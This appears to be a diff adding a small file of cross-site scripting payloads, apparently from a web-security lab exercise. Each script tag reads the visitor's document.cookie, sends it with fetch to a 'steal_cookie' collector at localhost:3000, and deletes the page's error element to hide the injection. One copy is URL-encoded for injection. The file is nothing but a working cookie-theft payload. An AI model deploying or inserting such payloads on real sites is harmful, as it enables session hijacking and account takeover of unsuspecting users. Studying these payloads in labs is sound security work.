@@ -1,0 +1,11 @@
+a
+
+<script>var cookies = document.cookie;console.log(cookies);const url = "http://localhost:3000/steal_cookie?cookie="%2bcookies;fetch(url);const element = document.getElementsByClassName('error')[0];element.remove();
+</script>
+
+<script>
+  const url = "http://localhost:3000/steal_cookie?cookie="+cookies;
+  fetch(url);
+  var element = document.getElementsByClassName('error')[0];
+  element.remove();
+</script>
